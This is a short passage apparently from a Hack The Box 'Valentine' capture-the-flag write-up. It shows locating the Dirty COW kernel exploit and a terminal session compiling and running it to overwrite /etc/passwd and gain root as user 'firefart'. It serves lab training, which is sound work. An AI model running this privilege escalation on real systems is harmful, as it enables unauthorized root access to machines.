      Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
          URL: https://www.exploit-db.com/exploits/40839/
         Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    File Type: C source, ASCII text, with CRLF line terminators
    
    Copied to: ~/hackthebox/valentine-10.10.10.79/40839.c
    

Uploaded to the box, compile, and run:

    hype@Valentine:/dev/shm$ gcc -pthread dc.c -o c -lcrypt
    
    hype@Valentine:/dev/shm$ file c
    c: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xe2dea237b60ba9dc122a44d0505f9796b0b8a159, not stripped
    hype@Valentine:/dev/shm$ chmod +x c
    hype@Valentine:/dev/shm$ ./c
    /etc/passwd successfully backed up to /tmp/passwd.bak
    Please enter the new password:
    Complete line:
    firefart:fifdjzBMn8d5E:0:0:pwned:/root:/bin/bash
    
    mmap: 7f004ef9b000
    
    
    hype@Valentine:/dev/shm$ su firefart
    Password:
    
    firefart@Valentine:/dev/shm# id
    uid=0(firefart) gid=0(root) groups=0(root)
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2018/07/28/htb-valentine.html)